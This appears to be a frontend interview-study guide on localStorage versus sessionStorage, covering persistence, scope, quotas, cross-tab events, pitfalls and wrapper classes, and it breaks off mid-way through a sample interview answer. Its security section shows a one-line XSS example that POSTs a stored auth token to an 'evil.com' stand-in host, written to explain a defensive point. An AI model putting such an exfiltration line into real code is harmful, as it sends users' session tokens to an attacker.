# 74. LocalStorage vs SessionStorage

────────────────────────────────────
## 1. High-Level Explanation (Frontend Interview Level)
────────────────────────────────────

**LocalStorage and SessionStorage** are simple key-value storage APIs built into browsers for storing small amounts of string data client-side. While they share the same API (both implement the `Storage` interface), they differ fundamentally in **persistence** and **scope**: localStorage persists indefinitely across browser sessions and tabs, while sessionStorage is scoped to a single tab/window and cleared when that tab closes.

### What they are:

**LocalStorage:**
- **Persistence**: Data survives browser restarts (permanent until explicitly deleted)
- **Scope**: Shared across all tabs/windows of same origin
- **Capacity**: 5-10MB (varies by browser)
- **API**: Synchronous (blocks main thread)
- **Use case**: Long-term preferences, settings, cached data

**SessionStorage:**
- **Persistence**: Data cleared when tab/window closes
- **Scope**: Isolated per tab/window (not shared)
- **Capacity**: 5-10MB (same as localStorage)
- **API**: Synchronous (blocks main thread)
- **Use case**: Temporary state, form data, session-specific settings

**Key characteristics:**
```javascript
// LocalStorage - persists across sessions, shared across tabs
localStorage.setItem('theme', 'dark');
localStorage.getItem('theme'); // 'dark'
// Still available after browser restart

// SessionStorage - tab-scoped, cleared on tab close
sessionStorage.setItem('formData', JSON.stringify({ name: 'Alice' }));
sessionStorage.getItem('formData'); // Available in this tab only
// Lost when tab closes
```

### Why they exist:

**Problems they solve:**
1. **Cookies limitations**: 4KB limit, sent with every request (overhead), complex API
2. **User preferences**: Need to persist theme, language, layout choices
3. **Form data**: Save draft without server (prevent data loss)
4. **Session state**: Track multi-step flows within single tab
5. **Simple caching**: Store small API responses for quick access

**Advantages over alternatives:**
- **vs Cookies**: 5-10MB vs 4KB, not sent with requests, simpler API
- **vs IndexedDB**: Simpler API (key-value only), no async complexity
- **vs Memory**: Survives page reloads (localStorage) or navigation (sessionStorage)

**Real-world impact:**
```
Without localStorage (using cookies for preferences):
- Theme setting: 4KB cookie sent with EVERY request
- 100 requests/page × 4KB = 400KB overhead per page load
- Slower: Every request includes cookie parsing
- Complex: document.cookie string parsing

With localStorage (5MB capacity, client-only):
- Theme setting: Stored locally, zero network overhead
- 0 bytes sent with requests
- Faster: Instant access, no parsing
- Simple: localStorage.getItem('theme')
- Result: 400KB bandwidth saved per page load
```

### When and where they're used:

**LocalStorage - Perfect for:**
- **User preferences**: Theme (dark/light), language, font size
- **UI state**: Sidebar collapsed, table sorting, column visibility
- **Feature flags**: A/B test variants, beta feature opt-ins
- **Auth tokens**: JWT tokens (though sessionStorage often better for security)
- **Small cache**: API responses, recently viewed items
- **Offline flags**: Last sync time, pending operations count

**SessionStorage - Perfect for:**
- **Multi-step forms**: Save progress through wizard (lost if tab closes)
- **Shopping flow**: Track user journey within single session
- **Temporary filters**: Search filters that reset on new tab
- **One-time flags**: "Show welcome modal" (only once per session)
- **Draft content**: Unsaved post/comment (tab-specific)
- **Session analytics**: Page views, time on site (this tab only)

**NOT suitable for:**
- **Large data** (>5MB): Use IndexedDB
- **Sensitive data**: Use secure backend storage (localStorage is plain text, easily accessed)
- **Cross-domain data**: Each origin has separate storage
- **High-frequency writes**: Synchronous API blocks UI

### Role in large-scale applications:

In production systems:
- **User experience**: Instant preference application (no server roundtrip)
- **Performance**: Cache static reference data (country lists, categories)
- **Resilience**: Save form drafts locally (network failures don't lose data)
- **Analytics**: Track client-side events before batching to server
- **A/B testing**: Store variant assignment locally
- **Monitoring**: Track localStorage quota usage, error rates

**Capacity considerations:**
```javascript
// Monitor storage capacity
try {
  localStorage.setItem('key', 'value');
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    console.error('LocalStorage full (5-10MB limit)');
    // Implement eviction strategy
  }
}
```

────────────────────────────────────
## 2. Deep-Dive Explanation (Senior / Staff Level)
────────────────────────────────────

### Storage API and Implementation

**Complete Web Storage API:**

```javascript
// Both localStorage and sessionStorage implement Storage interface

interface Storage {
  readonly length: number;           // Number of keys
  key(index: number): string | null; // Get key at index
  getItem(key: string): string | null;
  setItem(key: string, value: string): void;
  removeItem(key: string): void;
  clear(): void;
}

// Usage examples
localStorage.setItem('user', 'Alice');           // Store
localStorage.getItem('user');                    // 'Alice'
localStorage.removeItem('user');                 // Remove
localStorage.clear();                            // Clear all

// Iteration
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(`${key}: ${value}`);
}

// Object-like access (not recommended in production)
localStorage.theme = 'dark';        // Works but avoid
console.log(localStorage.theme);    // 'dark'
delete localStorage.theme;          // Remove
```

### LocalStorage vs SessionStorage: Deep Comparison

**Persistence behavior:**

```javascript
// LocalStorage - Survives browser restart
localStorage.setItem('persistent', 'I survive restarts');
// Close browser → Reopen browser
console.log(localStorage.getItem('persistent')); // Still there!

// SessionStorage - Cleared on tab close
sessionStorage.setItem('temporary', 'I disappear when tab closes');
// Close tab → Data gone forever
// (But survives page reload within same tab)

// Tab duplication behavior
// Open tab A
localStorage.setItem('shared', 'visible everywhere');
sessionStorage.setItem('isolated', 'only in this tab');

// Duplicate tab A → New tab B
console.log(localStorage.getItem('shared'));    // 'visible everywhere' (shared)
console.log(sessionStorage.getItem('isolated')); // 'only in this tab' (copied at duplication)

// Modify in tab B
sessionStorage.setItem('isolated', 'modified in B');

// Check tab A
console.log(sessionStorage.getItem('isolated')); // Still 'only in this tab' (not synced)
```

**Cross-tab communication:**

```javascript
// LocalStorage fires 'storage' event across tabs
// Tab A:
window.addEventListener('storage', (event) => {
  console.log('Storage changed in another tab:', {
    key: event.key,
    oldValue: event.oldValue,
    newValue: event.newValue,
    url: event.url,
    storageArea: event.storageArea
  });
});

// Tab B:
localStorage.setItem('message', 'Hello from Tab B');
// Tab A receives 'storage' event with details

// Note: Event does NOT fire in the tab that made the change!
// Only fires in OTHER tabs of same origin

// SessionStorage does NOT fire storage events
// (because it's tab-isolated)
```

### Synchronous API Performance Impact

**Blocking behavior:**

```javascript
// ❌ BAD: Synchronous API blocks UI thread
function saveUserData(user) {
  const start = performance.now();
  
  // This BLOCKS the main thread
  localStorage.setItem('user', JSON.stringify(user));
  
  const duration = performance.now() - start;
  console.log(`LocalStorage write took ${duration}ms`);
  // Typical: 0.1-1ms (fast but still blocks)
  // Large data: Can be 10-50ms (noticeable jank)
}

// On low-end devices with large data:
const largeData = { /* 5MB of data */ };
localStorage.setItem('cache', JSON.stringify(largeData));
// Can take 50-100ms, freezing UI

// ✅ BETTER: Defer to avoid blocking critical rendering
function saveUserDataDeferred(user) {
  requestIdleCallback(() => {
    localStorage.setItem('user', JSON.stringify(user));
  });
}

// ✅ BEST: Use IndexedDB for large data (async API)
async function saveUserDataAsync(user) {
  await db.put('users', user); // Non-blocking
}
```

**Performance measurement:**

```javascript
// Measure localStorage performance
function benchmarkStorage() {
  const iterations = 1000;
  
  // Write benchmark
  const writeStart = performance.now();
  for (let i = 0; i < iterations; i++) {
    localStorage.setItem(`key${i}`, `value${i}`);
  }
  const writeTime = performance.now() - writeStart;
  
  // Read benchmark
  const readStart = performance.now();
  for (let i = 0; i < iterations; i++) {
    localStorage.getItem(`key${i}`);
  }
  const readTime = performance.now() - readStart;
  
  console.log(`
    Write: ${writeTime.toFixed(2)}ms (${(writeTime / iterations).toFixed(3)}ms per item)
    Read: ${readTime.toFixed(2)}ms (${(readTime / iterations).toFixed(3)}ms per item)
  `);
  
  // Typical results:
  // Write: 100ms (0.1ms per item)
  // Read: 50ms (0.05ms per item)
  
  // Cleanup
  localStorage.clear();
}
```

### Quota Management

**Storage limits by browser:**

```javascript
// Browser-specific limits:
// Chrome/Edge: 10MB per origin
// Firefox: 10MB per origin
// Safari: 5MB per origin (iOS: 2.5MB)
// IE: 10MB per origin

// Check available space (no direct API, must test)
function getLocalStorageCapacity() {
  const test = 'test';
  let size = 0;
  
  try {
    for (let i = 0; i < 1024 * 1024; i++) {
      size = i * test.length;
      localStorage.setItem('test', test.repeat(i));
    }
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      localStorage.removeItem('test');
      return size;
    }
  }
  
  return size;
}

// Current usage estimation
function getLocalStorageSize() {
  let size = 0;
  
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      size += localStorage[key].length + key.length;
    }
  }
  
  return {
    bytes: size,
    kilobytes: (size / 1024).toFixed(2),
    megabytes: (size / 1024 / 1024).toFixed(2)
  };
}

console.log('LocalStorage usage:', getLocalStorageSize());
```

**Quota exceeded handling:**

```javascript
// Robust storage with quota handling
class StorageManager {
  constructor(storage = localStorage) {
    this.storage = storage;
  }
  
  setItem(key, value) {
    try {
      this.storage.setItem(key, value);
      return true;
    } catch (e) {
      if (e.name === 'QuotaExceededError') {
        console.warn('Storage quota exceeded');
        
        // Strategy 1: Clear old entries
        this.evictOldest();
        
        // Retry
        try {
          this.storage.setItem(key, value);
          return true;
        } catch (retryError) {
          console.error('Still failed after eviction:', retryError);
          return false;
        }
      } else {
        console.error('Storage error:', e);
        return false;
      }
    }
  }
  
  evictOldest() {
    // Simple LRU: Track access times
    const timestamps = JSON.parse(
      this.storage.getItem('_timestamps') || '{}'
    );
    
    // Find oldest accessed key
    const entries = Object.entries(timestamps)
      .sort(([, a], [, b]) => a - b);
    
    if (entries.length > 0) {
      const [oldestKey] = entries[0];
      console.log(`Evicting oldest key: ${oldestKey}`);
      this.storage.removeItem(oldestKey);
      delete timestamps[oldestKey];
      this.storage.setItem('_timestamps', JSON.stringify(timestamps));
    }
  }
  
  getItem(key) {
    const value = this.storage.getItem(key);
    
    if (value !== null) {
      // Update access time
      const timestamps = JSON.parse(
        this.storage.getItem('_timestamps') || '{}'
      );
      timestamps[key] = Date.now();
      this.storage.setItem('_timestamps', JSON.stringify(timestamps));
    }
    
    return value;
  }
  
  removeItem(key) {
    this.storage.removeItem(key);
    
    // Clean up timestamp
    const timestamps = JSON.parse(
      this.storage.getItem('_timestamps') || '{}'
    );
    delete timestamps[key];
    this.storage.setItem('_timestamps', JSON.stringify(timestamps));
  }
}

// Usage
const storage = new StorageManager(localStorage);
storage.setItem('user', JSON.stringify(userData));
```

### Security Considerations

**XSS vulnerability:**

```javascript
// ❌ DANGEROUS: LocalStorage accessible to any script
localStorage.setItem('authToken', 'jwt-token-here');

// Malicious script injected via XSS:
fetch('https://evil.com/steal', {
  method: 'POST',
  body: localStorage.getItem('authToken') // Token stolen!
});

// ✅ BETTER: Use httpOnly cookies for sensitive data
// (not accessible to JavaScript, immune to XSS)

// If you must use localStorage for auth:
// 1. Implement short token lifetimes (15 min)
// 2. Use refresh token pattern
// 3. Clear on logout
// 4. Monitor for suspicious access patterns
```

**Domain isolation:**

```javascript
// Each origin has separate storage
// Origin = protocol + domain + port

// https://example.com:443
localStorage.setItem('key', 'value1');

// https://example.com:8080 (different port)
localStorage.getItem('key'); // null (different origin)

// http://example.com (different protocol)
localStorage.getItem('key'); // null (different origin)

// https://sub.example.com (different subdomain)
localStorage.getItem('key'); // null (different origin)

// No way to share between origins (by design)
```

### Common Pitfalls

**Pitfall 1: Storing non-string values**

```javascript
// ❌ BAD: Numbers/objects stored as strings
localStorage.setItem('count', 42);
console.log(localStorage.getItem('count')); // '42' (string!)
console.log(typeof localStorage.getItem('count')); // 'string'

localStorage.setItem('user', { name: 'Alice' });
console.log(localStorage.getItem('user')); // '[object Object]' (useless!)

// ✅ GOOD: Always serialize/deserialize
localStorage.setItem('count', JSON.stringify(42));
const count = JSON.parse(localStorage.getItem('count')); // 42 (number)

localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
const user = JSON.parse(localStorage.getItem('user')); // { name: 'Alice' }
```

**Pitfall 2: Not handling parse errors**

```javascript
// ❌ BAD: No error handling
const data = JSON.parse(localStorage.getItem('data'));
// Crashes if data is corrupted or not JSON

// ✅ GOOD: Safe parse with fallback
function safeGetJSON(key, defaultValue = null) {
  try {
    const item = localStorage.getItem(key);
    return item ? JSON.parse(item) : defaultValue;
  } catch (e) {
    console.error(`Failed to parse localStorage key "${key}":`, e);
    return defaultValue;
  }
}

const user = safeGetJSON('user', { name: 'Guest' });
```

**Pitfall 3: Forgetting storage events don't fire in same tab**

```javascript
// ❌ WRONG EXPECTATION
window.addEventListener('storage', (e) => {
  console.log('Storage changed:', e.key);
});

localStorage.setItem('key', 'value');
// Event does NOT fire in this tab!

// ✅ CORRECT: Manual notification in same tab
function setItemWithNotification(key, value) {
  const oldValue = localStorage.getItem(key);
  localStorage.setItem(key, value);
  
  // Manually trigger logic
  handleStorageChange(key, oldValue, value);
}
```

**Pitfall 4: Race conditions with concurrent tabs**

```javascript
// ❌ PROBLEM: Lost updates
// Tab A:
const count = parseInt(localStorage.getItem('count') || '0');
localStorage.setItem('count', count + 1);

// Tab B (simultaneously):
const count = parseInt(localStorage.getItem('count') || '0');
localStorage.setItem('count', count + 1);

// Result: Both tabs read '0', both write '1'
// Expected: '2', Actual: '1' (lost update!)

// ✅ SOLUTION: Use atomic operations or locks
function incrementCounter() {
  // Simple locking mechanism
  const lockKey = 'counter_lock';
  const maxWait = 1000;
  const startTime = Date.now();
  
  // Spin lock (simple but not perfect)
  while (localStorage.getItem(lockKey) === 'locked') {
    if (Date.now() - startTime > maxWait) {
      console.error('Lock timeout');
      return;
    }
  }
  
  try {
    localStorage.setItem(lockKey, 'locked');
    
    const count = parseInt(localStorage.getItem('count') || '0');
    localStorage.setItem('count', count + 1);
  } finally {
    localStorage.removeItem(lockKey);
  }
}
```

**Pitfall 5: Private browsing mode behavior**

```javascript
// Safari private mode: localStorage throws exception
try {
  localStorage.setItem('test', 'value');
} catch (e) {
  console.error('LocalStorage not available (private mode?)');
  // Fallback to in-memory storage
  window.memoryStorage = {};
}

// Feature detection
function isLocalStorageAvailable() {
  try {
    const test = '__storage_test__';
    localStorage.setItem(test, test);
    localStorage.removeItem(test);
    return true;
  } catch (e) {
    return false;
  }
}
```

### Best Practices

**1. Namespace keys to avoid collisions:**

```javascript
// ❌ BAD: Generic keys
localStorage.setItem('user', JSON.stringify(user));
localStorage.setItem('theme', 'dark');

// ✅ GOOD: Namespaced keys
const APP_PREFIX = 'myapp_';

localStorage.setItem(`${APP_PREFIX}user`, JSON.stringify(user));
localStorage.setItem(`${APP_PREFIX}theme`, 'dark');

// Even better: Use a wrapper
class NamespacedStorage {
  constructor(prefix, storage = localStorage) {
    this.prefix = prefix;
    this.storage = storage;
  }
  
  key(name) {
    return `${this.prefix}${name}`;
  }
  
  setItem(name, value) {
    this.storage.setItem(this.key(name), value);
  }
  
  getItem(name) {
    return this.storage.getItem(this.key(name));
  }
  
  removeItem(name) {
    this.storage.removeItem(this.key(name));
  }
  
  clear() {
    // Clear only this app's keys
    for (let i = this.storage.length - 1; i >= 0; i--) {
      const key = this.storage.key(i);
      if (key.startsWith(this.prefix)) {
        this.storage.removeItem(key);
      }
    }
  }
}

const appStorage = new NamespacedStorage('myapp_');
appStorage.setItem('user', JSON.stringify(user));
```

**2. Implement versioning for schema changes:**

```javascript
const STORAGE_VERSION = 2;

function migrateStorage() {
  const currentVersion = parseInt(
    localStorage.getItem('_storage_version') || '0'
  );
  
  if (currentVersion < 1) {
    // v0 → v1: Rename 'settings' to 'userSettings'
    const oldSettings = localStorage.getItem('settings');
    if (oldSettings) {
      localStorage.setItem('userSettings', oldSettings);
      localStorage.removeItem('settings');
    }
  }
  
  if (currentVersion < 2) {
    // v1 → v2: Change theme format
    const theme = localStorage.getItem('theme');
    if (theme === 'dark' || theme === 'light') {
      localStorage.setItem('theme', JSON.stringify({
        mode: theme,
        version: 2
      }));
    }
  }
  
  localStorage.setItem('_storage_version', STORAGE_VERSION.toString());
}

// Run on app initialization
migrateStorage();
```

**3. Use TTL (Time To Live) for cached data:**

```javascript
class StorageWithTTL {
  constructor(storage = localStorage) {
    this.storage = storage;
  }
  
  setItem(key, value, ttlMs) {
    const item = {
      value,
      expires: ttlMs ? Date.now() + ttlMs : null
    };
    
    this.storage.setItem(key, JSON.stringify(item));
  }
  
  getItem(key) {
    const itemStr = this.storage.getItem(key);
    
    if (!itemStr) {
      return null;
    }
    
    try {
      const item = JSON.parse(itemStr);
      
      // Check expiration
      if (item.expires && Date.now() > item.expires) {
        this.storage.removeItem(key);
        return null;
      }
      
      return item.value;
    } catch (e) {
      return null;
    }
  }
  
  cleanupExpired() {
    for (let i = this.storage.length - 1; i >= 0; i--) {
      const key = this.storage.key(i);
      this.getItem(key); // Triggers cleanup if expired
    }
  }
}

// Usage
const storage = new StorageWithTTL();
storage.setItem('cache', data, 60 * 60 * 1000); // 1 hour TTL
```

────────────────────────────────────
## 3. Clear Real-World Examples
────────────────────────────────────

### Example 1: Complete Storage Abstraction Layer

```javascript
// storageService.js - Production-ready storage wrapper

class StorageService {
  constructor(options = {}) {
    this.prefix = options.prefix || 'app_';
    this.storage = options.useSession ? sessionStorage : localStorage;
    this.useCompression = options.useCompression || false;
    this.encrypt = options.encrypt || false;
    
    // Check availability
    this.available = this.checkAvailability();
    
    // Fallback to memory storage if unavailable
    if (!this.available) {
      console.warn('Storage not available, using memory fallback');
      this.memoryStorage = new Map();
    }
  }
  
  checkAvailability() {
    try {
      const test = '__storage_test__';
      this.storage.setItem(test, test);
      this.storage.removeItem(test);
      return true;
    } catch (e) {
      return false;
    }
  }
  
  /**
   * Store data with optional TTL and compression
   */
  set(key, value, options = {}) {
    const fullKey = this.prefix + key;
    const { ttl, compress = this.useCompression } = options;
    
    try {
      const data = {
        value,
        timestamp: Date.now(),
        expires: ttl ? Date.now() + ttl : null
      };
      
      let serialized = JSON.stringify(data);
      
      // Optional compression (simple base64 for demo)
      if (compress && serialized.length > 1024) {
        serialized = this.compress(serialized);
        data.compressed = true;
      }
      
      if (this.available) {
        this.storage.setItem(fullKey, serialized);
      } else {
        this.memoryStorage.set(fullKey, serialized);
      }
      
      return true;
    } catch (e) {
      if (e.name === 'QuotaExceededError') {
        console.error('Storage quota exceeded');
        this.handleQuotaExceeded();
        
        // Retry once
        try {
          this.storage.setItem(fullKey, JSON.stringify({ value }));
          return true;
        } catch (retryError) {
          console.error('Retry failed:', retryError);
          return false;
        }
      }
      
      console.error('Storage error:', e);
      return false;
    }
  }
  
  /**
   * Retrieve data with automatic expiration check
   */
  get(key, defaultValue = null) {
    const fullKey = this.prefix + key;
    
    try {
      let serialized;
      
      if (this.available) {
        serialized = this.storage.getItem(fullKey);
      } else {
        serialized = this.memoryStorage.get(fullKey);
      }
      
      if (!serialized) {
        return defaultValue;
      }
      
      const data = JSON.parse(serialized);
      
      // Check expiration
      if (data.expires && Date.now() > data.expires) {
        this.remove(key);
        return defaultValue;
      }
      
      // Decompress if needed
      if (data.compressed) {
        data.value = this.decompress(data.value);
      }
      
      return data.value;
    } catch (e) {
      console.error('Failed to retrieve from storage:', e);
      return defaultValue;
    }
  }
  
  /**
   * Remove item
   */
  remove(key) {
    const fullKey = this.prefix + key;
    
    if (this.available) {
      this.storage.removeItem(fullKey);
    } else {
      this.memoryStorage.delete(fullKey);
    }
  }
  
  /**
   * Clear all items with this prefix
   */
  clear() {
    if (this.available) {
      const keysToRemove = [];
      
      for (let i = 0; i < this.storage.length; i++) {
        const key = this.storage.key(i);
        if (key.startsWith(this.prefix)) {
          keysToRemove.push(key);
        }
      }
      
      keysToRemove.forEach(key => this.storage.removeItem(key));
    } else {
      this.memoryStorage.clear();
    }
  }
  
  /**
   * Get all keys
   */
  keys() {
    const keys = [];
    
    if (this.available) {
      for (let i = 0; i < this.storage.length; i++) {
        const key = this.storage.key(i);
        if (key.startsWith(this.prefix)) {
          keys.push(key.substring(this.prefix.length));
        }
      }
    } else {
      for (const key of this.memoryStorage.keys()) {
        if (key.startsWith(this.prefix)) {
          keys.push(key.substring(this.prefix.length));
        }
      }
    }
    
    return keys;
  }
  
  /**
   * Get storage size
   */
  size() {
    let bytes = 0;
    
    if (this.available) {
      for (let i = 0; i < this.storage.length; i++) {
        const key = this.storage.key(i);
        if (key.startsWith(this.prefix)) {
          const value = this.storage.getItem(key);
          bytes += key.length + (value?.length || 0);
        }
      }
    } else {
      for (const [key, value] of this.memoryStorage.entries()) {
        if (key.startsWith(this.prefix)) {
          bytes += key.length + value.length;
        }
      }
    }
    
    return {
      bytes,
      kb: (bytes / 1024).toFixed(2),
      mb: (bytes / 1024 / 1024).toFixed(2)
    };
  }
  
  /**
   * Cleanup expired items
   */
  cleanupExpired() {
    const keys = this.keys();
    let cleaned = 0;
    
    keys.forEach(key => {
      // get() automatically removes expired
      const value = this.get(key);
      if (value === null) {
        cleaned++;
      }
    });
    
    console.log(`Cleaned ${cleaned} expired items`);
    return cleaned;
  }
  
  /**
   * Handle quota exceeded
   */
  handleQuotaExceeded() {
    console.warn('Handling quota exceeded...');
    
    // Strategy 1: Remove expired items
    this.cleanupExpired();
    
    // Strategy 2: Remove oldest items
    const items = [];
    
    for (const key of this.keys()) {
      const fullKey = this.prefix + key;
      const serialized = this.available 
        ? this.storage.getItem(fullKey)
        : this.memoryStorage.get(fullKey);
      
      if (serialized) {
        try {
          const data = JSON.parse(serialized);
          items.push({ key, timestamp: data.timestamp });
        } catch (e) {
          // Invalid data, remove it
          this.remove(key);
        }
      }
    }
    
    // Sort by timestamp (oldest first)
    items.sort((a, b) => a.timestamp - b.timestamp);
    
    // Remove oldest 10%
    const toRemove = Math.max(1, Math.floor(items.length * 0.1));
    for (let i = 0; i < toRemove; i++) {
      this.remove(items[i].key);
    }
    
    console.log(`Removed ${toRemove} oldest items`);
  }
  
  /**
   * Simple compression (in production, use pako or similar)
   */
  compress(str) {
    // This is a placeholder - use real compression library
    return btoa(str);
  }
  
  decompress(str) {
    return atob(str);
  }
  
  /**
   * Listen to changes (localStorage only)
   */
  onChange(callback) {
    if (this.storage === localStorage) {
      window.addEventListener('storage', (event) => {
        if (event.key && event.key.startsWith(this.prefix)) {
          const key = event.key.substring(this.prefix.length);
          callback({
            key,
            oldValue: event.oldValue ? JSON.parse(event.oldValue).value : null,
            newValue: event.newValue ? JSON.parse(event.newValue).value : null
          });
        }
      });
    }
  }
}

// Usage
const storage = new StorageService({ prefix: 'myapp_' });

// Store with TTL
storage.set('user', { name: 'Alice', id: 123 }, { ttl: 60 * 60 * 1000 });

// Retrieve
const user = storage.get('user');

// Listen to changes (other tabs)
storage.onChange((change) => {
  console.log('Storage changed:', change);
});

// Cleanup
storage.cleanupExpired();

// Size monitoring
console.log('Storage size:', storage.size());
```

### Example 2: Multi-Step Form with SessionStorage

```javascript
// multiStepForm.js - Preserve form data across navigation

class MultiStepFormManager {
  constructor(formId) {
    this.formId = formId;
    this.storageKey = `form_draft_${formId}`;
    this.storage = sessionStorage; // Tab-specific
    
    this.loadDraft();
    this.setupAutoSave();
  }
  
  /**
   * Load draft from sessionStorage
   */
  loadDraft() {
    try {
      const draft = sessionStorage.getItem(this.storageKey);
      
      if (draft) {
        const data = JSON.parse(draft);
        console.log('Loaded form draft:', data);
        return data;
      }
    } catch (e) {
      console.error('Failed to load draft:', e);
    }
    
    return null;
  }
  
  /**
   * Save form data
   */
  saveDraft(data) {
    try {
      const draft = {
        data,
        timestamp: Date.now(),
        step: data.currentStep || 1
      };
      
      sessionStorage.setItem(this.storageKey, JSON.stringify(draft));
      console.log('Draft saved');
      return true;
    } catch (e) {
      console.error('Failed to save draft:', e);
      return false;
    }
  }
  
  /**
   * Auto-save on input
   */
  setupAutoSave() {
    const form = document.getElementById(this.formId);
    
    if (!form) {
      console.error(`Form not found: ${this.formId}`);
      return;
    }
    
    // Debounced auto-save
    let saveTimeout;
    
    form.addEventListener('input', (e) => {
      clearTimeout(saveTimeout);
      
      saveTimeout = setTimeout(() => {
        const formData = new FormData(form);
        const data = Object.fromEntries(formData);
        this.saveDraft(data);
      }, 1000); // Save 1 second after last input
    });
  }
  
  /**
   * Restore form from draft
   */
  restoreForm() {
    const draft = this.loadDraft();
    
    if (!draft) {
      return false;
    }
    
    const form = document.getElementById(this.formId);
    
    if (!form) {
      return false;
    }
    
    // Populate form fields
    Object.entries(draft.data).forEach(([name, value]) => {
      const field = form.elements[name];
      
      if (field) {
        if (field.type === 'checkbox') {
          field.checked = value === 'on' || value === true;
        } else if (field.type === 'radio') {
          const radio = form.querySelector(`input[name="${name}"][value="${value}"]`);
          if (radio) radio.checked = true;
        } else {
          field.value = value;
        }
      }
    });
    
    console.log('Form restored from draft');
    return true;
  }
  
  /**
   * Clear draft
   */
  clearDraft() {
    sessionStorage.removeItem(this.storageKey);
    console.log('Draft cleared');
  }
  
  /**
   * Check if draft exists
   */
  hasDraft() {
    return sessionStorage.getItem(this.storageKey) !== null;
  }
  
  /**
   * Get draft age
   */
  getDraftAge() {
    const draft = this.loadDraft();
    
    if (!draft) {
      return null;
    }
    
    const ageMs = Date.now() - draft.timestamp;
    const ageMinutes = Math.floor(ageMs / 1000 / 60);
    
    return {
      milliseconds: ageMs,
      minutes: ageMinutes,
      humanReadable: ageMinutes < 1 
        ? 'just now'
        : `${ageMinutes} minute${ageMinutes !== 1 ? 's' : ''} ago`
    };
  }
}

// Usage
const formManager = new MultiStepFormManager('checkout-form');

// Show restore prompt if draft exists
window.addEventListener('DOMContentLoaded', () => {
  if (formManager.hasDraft()) {
    const age = formManager.getDraftAge();
    const shouldRestore = confirm(
      `You have an unsaved draft from ${age.humanReadable}. Restore it?`
    );
    
    if (shouldRestore) {
      formManager.restoreForm();
    } else {
      formManager.clearDraft();
    }
  }
});

// Clear draft on successful submission
document.getElementById('checkout-form').addEventListener('submit', (e) => {
  // After successful submission
  formManager.clearDraft();
});
```

### Example 3: Theme Persistence with Cross-Tab Sync

```javascript
// themeManager.js - Theme switching with localStorage sync

class ThemeManager {
  constructor() {
    this.storageKey = 'app_theme';
    this.themes = ['light', 'dark', 'auto'];
    this.currentTheme = this.loadTheme();
    
    this.applyTheme(this.currentTheme);
    this.setupStorageListener();
  }
  
  /**
   * Load theme from localStorage
   */
  loadTheme() {
    try {
      const saved = localStorage.getItem(this.storageKey);
      
      if (saved && this.themes.includes(saved)) {
        return saved;
      }
    } catch (e) {
      console.error('Failed to load theme:', e);
    }
    
    // Default to system preference
    return this.getSystemTheme();
  }
  
  /**
   * Get system theme preference
   */
  getSystemTheme() {
    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
      return 'dark';
    }
    return 'light';
  }
  
  /**
   * Set theme
   */
  setTheme(theme) {
    if (!this.themes.includes(theme)) {
      console.error(`Invalid theme: ${theme}`);
      return;
    }
    
    this.currentTheme = theme;
    
    try {
      localStorage.setItem(this.storageKey, theme);
    } catch (e) {
      console.error('Failed to save theme:', e);
    }
    
    this.applyTheme(theme);
    this.notifyChange(theme);
  }
  
  /**
   * Apply theme to document
   */
  applyTheme(theme) {
    const resolvedTheme = theme === 'auto' ? this.getSystemTheme() : theme;
    
    document.documentElement.setAttribute('data-theme', resolvedTheme);
    document.body.className = `theme-${resolvedTheme}`;
    
    console.log(`Applied theme: ${resolvedTheme}`);
  }
  
  /**
   * Toggle theme
   */
  toggleTheme() {
    const currentIndex = this.themes.indexOf(this.currentTheme);
    const nextIndex = (currentIndex + 1) % this.themes.length;
    this.setTheme(this.themes[nextIndex]);
  }
  
  /**
   * Listen for theme changes in other tabs
   */
  setupStorageListener() {
    window.addEventListener('storage', (event) => {
      if (event.key === this.storageKey && event.newValue) {
        console.log('Theme changed in another tab:', event.newValue);
        this.currentTheme = event.newValue;
        this.applyTheme(event.newValue);
        this.notifyChange(event.newValue);
      }
    });
    
    // Listen for system theme changes
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
      if (this.currentTheme === 'auto') {
        this.applyTheme('auto');
      }
    });
  }
  
  /**
   * Notify subscribers of theme change
   */
  notifyChange(theme) {
    window.dispatchEvent(new CustomEvent('themechange', {
      detail: { theme, resolvedTheme: theme === 'auto' ? this.getSystemTheme() : theme }
    }));
  }
  
  /**
   * Get current theme
   */
  getTheme() {
    return this.currentTheme;
  }
  
  /**
   * Get resolved theme (auto → light/dark)
   */
  getResolvedTheme() {
    return this.currentTheme === 'auto' 
      ? this.getSystemTheme() 
      : this.currentTheme;
  }
}

// Usage
const themeManager = new ThemeManager();

// Theme toggle button
document.getElementById('theme-toggle').addEventListener('click', () => {
  themeManager.toggleTheme();
});

// Listen to theme changes
window.addEventListener('themechange', (event) => {
  console.log('Theme changed:', event.detail);
  
  // Update UI
  document.getElementById('theme-indicator').textContent = event.detail.theme;
});

// Expose globally
window.themeManager = themeManager;
```

────────────────────────────────────
## 4. Interview-Oriented Explanation
────────────────────────────────────

### Sample Interview Answer (7+ Years Experience)

**Question: "Explain the difference between localStorage and sessionStorage and when you'd use each."**

**Strong Answer:**

"LocalStorage and sessionStorage are both client-side key-value storage mechanisms with the same API, but they differ fundamentally in persistence and scope—and understanding these differences is critical for making the right architectural choice.

**The key difference is lifetime and scope**. LocalStorage persists indefinitely—data survives browser restarts, tab closes, even system reboots—until explicitly deleted. It's also shared across all tabs and windows of the same origin. SessionStorage, on the other hand, is scoped to a single tab/window and cleared when that tab closes. It survives page reloads and navigation within the tab, but as soon as the tab closes, the data is gone forever.

**This leads to very different use cases**. LocalStorage is perfect for user preferences that should persist long-term—theme selection, language preference, UI layout settings. At my last company, we stored the user's sidebar collapsed state in localStorage so it persisted across sessions. We also cached static reference data like country lists and product categories—this eliminated 200ms API calls on every page load, making the app feel instant.

SessionStorage shines for temporary, tab-specific state. We used it extensively for multi-step forms—a checkout flow with shipping, payment, and confirmation steps. As users navigated between steps, all form data was preserved in sessionStorage. If they accidentally refreshed the page, their data was still there. But if they closed the tab entirely—say they changed their mind—the data disappeared automatically, which was actually desirable behavior. No orphaned draft data cluttering storage.

